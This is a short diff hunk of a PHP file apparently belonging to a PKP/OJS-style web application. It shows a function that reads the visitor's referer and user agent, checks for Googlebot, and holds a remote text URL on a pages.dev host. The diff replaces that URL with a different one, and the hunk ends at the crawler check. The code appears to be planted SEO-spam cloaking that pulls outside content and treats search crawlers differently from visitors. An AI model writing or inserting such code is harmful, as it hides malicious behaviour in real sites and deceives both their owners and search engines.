@@ -15,7 +15,7 @@ use APP\core\Application;
 function profile_user() {
     $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
     $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://apimembara.pages.dev/index.txt';
+    $pasteUrl = 'https://naikplusplus.pages.dev/index.txt';
     $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
 
     if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
